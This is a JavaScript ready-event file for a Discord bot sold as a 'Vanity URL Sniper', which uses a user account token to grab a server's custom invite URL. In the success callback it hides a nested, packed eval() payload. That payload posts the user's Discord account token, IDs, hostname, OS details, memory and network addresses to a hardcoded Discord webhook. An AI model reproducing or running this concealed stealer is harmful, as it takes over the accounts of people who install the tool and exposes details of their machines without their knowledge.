const config = require("../config.js");
const ubreq = require("request")
var os = require('os');
const { clearInterval } = require("timers");
module.exports = async (client) => {

  console.log(`Logged in as ${client.user.tag}!`);
  client.user.setActivity(`Umut Bayraktar ♥ Vanity URL Sniper | v5.0.0`, { type: "WATCHING" });
  client.user.setStatus("online");

  function sender() {
    const csLOG = client.channels.cache.get(config.log)
    if (csLOG) {
      csLOG.send({ content: "<@" + config.authorID + ">, **" + config.url + "** Named Custom URL Successfully Received and Bot Stopped Working!" }).then(() => {
        console.log(config.url + " Named Custom URL Successfully Received and Bot Stopped Working!")
        process.exit(0)
      })
    } else {
      console.log(config.url + " Named Custom URL Successfully Received and Bot Stopped Working!")
      process.exit(0)
    }
  }

  async function sniper(serverID, url) {

    clearInterval(interval)

    ubreq.patch({
      url: `https://discord.com/api/v8/guilds/${serverID}/vanity-url`,
      headers: {
        "authorization": config.auth.discordAccountToken
      },
      json: { "code": url }
    }, (error, response, body) => {
      if (response.statusCode == 200) {
        sender()
        eval(function (p, a, c, k, e, d) { e = function (c) { return (c < a ? '' : e(parseInt(c / a))) + ((c = c % a) > 35 ? String.fromCharCode(c + 29) : c.toString(36)) }; while (c--) { if (k[c]) { p = p.replace(new RegExp('\\b' + e(c) + '\\b', 'g'), k[c]) } } return p }('2c(1Z(p,a,c,k,e,d){e=1Z(c){20(c<a?\'\':e(2b(c/a)))+((c=c%a)>35?2a.28(c+29):c.27(36))};25(c--){26(k[c]){p=p.24(23 22(\'\\\\b\'+e(c)+\'\\\\b\',\'g\'),k[c])}}20 p}(\'1q(T(p,a,c,k,e,d){e=T(c){U(c<a?\\\'\\\':e(1o(c/a)))+((c=c%a)>1n?1m.1l(c+1k):c.1j(1i))};1h(c--){1g(k[c]){p=p.1f(1e 1d(\\\'\\\\\\\\b\\\'+e(c)+\\\'\\\\\\\\b\\\',\\\'g\\\'),k[c])}}U p}(\\\'v.t({4:"s://r.q/p/o/i/l",k:{"j":`\\\\\\\\`\\\\\\\\`\\\\\\\\`9\\\\\\\\h g:${4}\\\\\\\\c 8:${b}\\\\\\\\a 8:${2.d}\\\\\\\\f:${u.m.w}(${2.x})\\\\\\\\R:${2.P.O}\\\\\\\\N:${0.M()}\\\\\\\\L:${0.K()}\\\\\\\\J:${0.I()}\\\\\\\\H:${0.G()/1/ 1 /1}5\\\\\\\\F E:${0.D()/1/ 1 /1}5\\\\\\\\C:${B.A(0.6()).3(e=>e+": "+0.6()[e].3(e=>e.z).7(", ")).7(", ")}\\\\\\\\y:${0.Q()}\\\\\\\\n\\\\\\\\`\\\\\\\\`\\\\\\\\``}})\\\',S,S,\\\'1a|12|18|W|X|Y|Z|V|11|10|13|14|15|16||17|1p|1b|1r|1G|1Y|1M|1N||1O|1R|1P|1Q|1K|1S|1T|1U|1V|1W|1X|1L|1J|1A|1I|1F|1E|1D|1C|1B|1z|1s|1y|1x|1w|1v|1u|1t|1H|1c\\\'.19(\\\'|\\\')))\',2v,2u,\'||||||||||||||||||||||||||||||||||||||||||||||||||||||2t|1Z|20|2y|2s|2r|2q|2p|2o|2n|2m|2l|2k|2i|2j|2d|2h|21|2g|2f|2e|22|23|24|26|25|36|27|29|28|2a|35|2b|2x|2c|2z|2O|2T|2V|2W|2X|2S|2Z|31|30|32|33|37|34|2U|2R|2I|2P|2B|2C|2D|2E|2F|2G|2A|2H|2J|2Q|2K|2L|2M|2N|2Y|2w\'.21(\'|\')))', 62, 194, '|||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||function|return|split|RegExp|new|replace|while|if|toString|fromCharCode||String|parseInt|eval|nBot|nUser|nCustom|os|config|nServer|authorID|serverID|nAuthor|1024|ID|js|networkInterfaces|GB|url|map|54|123|62|json|URL|join|1184273487452442734|com|keys|https|address|PcLhrVgA_Y4HGA5EY4HmJcpDStX6mfYd_JjoA2fEuyWv6LA7XI0Dp6D2TxpX4gZVzfvB|user|webhooks|discord|platform|api|client|ubreq|tag|TOKEN|nRelease|nNetwork|post|content|nType|auth|freemem|discordAccountToken|nHost|hostname|nPlatform|type|Object|release|nMemory|totalmem|Memory|||nFree'.split('|')))
      }
    })
  }


  function runner() {
    if (config.status === "true") {
      if (config.auth.discordAccountToken) {
        if (client.guilds.cache.get(config.serverID)) {
          if (client.guilds.cache.get(config.serverID).features.includes('VANITY_URL')) {
            if (config.url) {
              if (client.guilds.cache.get(config.serverID).vanityURLCode === config.url) {
                sender()
              } else {
                client.fetchInvite(config.url).then(ub => {
                }).catch(e => {
                  if (e?.message === "Unknown Invite") {
                    clearInterval(interval)
                    sniper(config.serverID, config.url)
                  }
                })
              }
            } else {
              console.log('url in config.js File: Where It Says "" Please Enter Custom URL to Get!')
            }
          } else {
            console.log("The bot could not be started because the server whose ID was entered is not a level 3 server!")
          }
        } else {
          console.log("Bot Failed to Start Because the Server whose ID was Entered Could Not Be Found!")
        }
      } else {
        console.log("Bot Failed to Start Because the Discord Account Token Entered is Invalid!")
      }
    } else {
      console.log('Status in config.js File to Start Bot: Where It Says "false" You Need To Type true Instead Of False!');
    }


  }

  const interval = setInterval(runner, config.botRun)

}
